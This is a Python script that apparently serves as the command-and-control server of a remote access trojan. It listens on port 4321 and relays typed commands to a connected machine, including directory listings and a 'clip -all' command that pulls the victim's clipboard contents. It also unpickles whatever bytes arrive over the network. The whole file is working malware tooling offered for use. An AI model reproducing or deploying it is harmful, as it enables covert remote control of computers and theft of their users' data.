import pickle
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 4321))
s.listen()
print("Server listening for incoming connections...")

conn, addr = s.accept()
print("Connection from " + addr[0] + " on port " + str(addr[1]))

while True:
    command = input("cmd> ")
    if len(command) == 0:
        continue
    if command.lower() == "exit":
        conn.send(command.encode())
        s.close()
        break
    conn.send(command.encode())

    # Receives and loads pickle into list, and outputs the elements in the list
    if command.lower() == "clip -all":
        res = conn.recv(4096)
        result = pickle.loads(res)
        print("Clipboard: \n")
        for word in result:
            print("[*]" + word + "\n")
    # If command is 'dir' we have to replace '\xff' with space, otherwise the .decode()-function will crash
    elif command.lower() == "dir":
        result = conn.recv(4096).replace(b"\xff", b" ")
        print(result.decode())
    else:
        print(conn.recv(4096).decode())
